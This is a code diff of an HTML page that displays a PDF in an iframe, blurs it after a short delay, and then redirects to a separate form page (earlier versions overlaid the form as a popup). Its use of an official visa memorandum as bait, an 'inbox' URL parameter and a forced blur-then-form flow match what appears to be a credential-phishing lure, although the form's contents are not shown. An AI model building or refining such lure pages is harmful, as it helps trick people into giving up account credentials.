@@ -8,8 +8,7 @@
 <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p69AAAAplJREFUWIXt1j2IHGUYB/DfOzdnjIKFkECIVWIKvUFsIkRExa9KJCLaWAgWJx4DilZWgpDDiI0wiViIoGATP1CCEDYHSeCwUBBkgiiKURQJFiLo4d0eOxYzC8nsO9m9XcXC+8MW+3z+9/l6l2383xH+iSBpElyTdoda26xsDqp/h0CVZ3vwKm7tMBngAs7h7eRYebG6hMtMBHbMBX89vfARHprQ5U8cwdFQlIOZCVR5di1+w/wWXT/EY6EoN5NZCODuKZLDwzgSMCuBe2fwfX6QZwtpWzqfBBtLC3txF/ZhxKbBGx0EfsTJS77vwmGjlZrD4mUzUOXZjVjGI65cnTXchB8iupdDUb7QinsQZ7GzZftdQj2JVZ49iC/w6JjksIo7OnS9tiA5Vn6GtyK2+1MY5NkhfGDygVrBAxH5WkPuMjR7/3UsUFLl2Q68s4XkA3ws3v9zoSjX28Kr5wL1xrTxa6ou+f6OZGvqPg9v1wZeaUjcELE/DVfNhWFSvy/enOIZ9eq1sTokEMNLWI79oirP8g6fXpVnh7GEvY1sV/OJ4f0UhyKKk6EoX4x5pEkgXv6L6OM99YqNw/c4kXSwG5nkIfpLCynuiahW1GWeJHkfT4aiXO9atz1XcD6I6yLyHu6bIPk6Hg9FeYZ63y9EjBarPDvQ8VJ1nd9V3D4m+RncForyxFCQ4hSeahlej88Hefauurdwaufr5z/F/ZHAX6nL+mZE18e36IWiHLkFocqzW9QXcNz1+wUHxJ/f10JRPjvGP4pk/vj5L3F8AtufdD+/p6dJDknzX+05fDLGtife/766t9MRgFCUffWTudwE3AqBlVCUf0xLYGTQqzzbhydwJ3Y34g318J1tmX+DPBTlz9MS2MY2/nP8DTGaqeTDf30rAAAAAElFTkSuQmCC" type="image/x-icon">
 <style>
 iframe {
-  width: 460px;       /* or fixed width like 600px */
-  height: 400px;     /* your desired height */
+  
   border: 2px inset black;  /* shorthand for border */
   overflow: hidden;  /* hides scrollbars inside iframe if needed */
 }
@@ -17,7 +16,7 @@ iframe {
 body {
 margin: 0;
 font-family: Arial, sans-serif;
-height: 100vh;
+height: 640px;
 overflow: hidden;
 }
 
@@ -92,6 +91,7 @@ width: 520px;
 box-shadow: 0 4px 20px rgba(0,0,0,0.3);
 text-align: center;
 animation: fadeIn 0.5s ease;
+z-index: 1000;
 }
 
 .popup img {
@@ -141,7 +141,10 @@ cursor: pointer;
 .popup button:hover {
 background: #007bb5;
 }
-
+.blur-wrapper {
+  filter: blur(5px);
+  pointer-events: none; /* optional: disable interaction while blurred */
+}
 @keyframes fadeIn {
 from { opacity: 0; transform: scale(0.9); }
 to { opacity: 1; transform: scale(1); }
@@ -177,25 +180,19 @@ console.warn("No inbox parameter found in URL");
 </head>
 <body>
 <!-- PDF as background -->
-<iframe id="pdfFrame" class="pdf-background" src="./MoU betn UAE and Pakistan on Entry Visa.pdf#toolbar=0&navpanes=0&scrollbar=0"></iframe>
-
+<div class="iframe-wrapper" style="height: 640px;">
+   <iframe  id="pdfFrame" src="https://arxiv.org/pdf/1706.03762.pdf" width="100%" height="100%"></iframe>
+</div>
 <!-- Loader -->
 <div class="loader" id="loader"></div>
 
-<!-- Popup -->
-<div class="overlay" id="popupOverlay">
-<div class="popup">
-  <iframe src="FormPopUp.html" >
-          
-  </iframe>
-</form>
-</div>
-</div>
+
 
 <script>
 const pdfFrame = document.getElementById("pdfFrame");
 const loader = document.getElementById("loader");
 const popup = document.getElementById("popupOverlay");
+const wrapper = document.querySelector('.iframe-wrapper');
 
 pdfFrame.addEventListener("load", () => {
 // PDF fully loaded, no blur yet
@@ -203,14 +200,15 @@ console.log("PDF loaded, showing document first");
 
 // Wait 3s before showing loader
 setTimeout(() => {
+console.log("blurrr");
 loader.style.display = "block";
 pdfFrame.classList.add("blur");
+wrapper.classList.add('blur-wrapper');
 
 // After 3s, hide loader and show popup
 setTimeout(() => {
-loader.style.display = "none";
-pdfFrame.classList.remove("blur");
-popup.style.display = "flex";
+ window.location.href = 'FormPopUp.html';
+
 }, 3000);
 
 }, 3000);
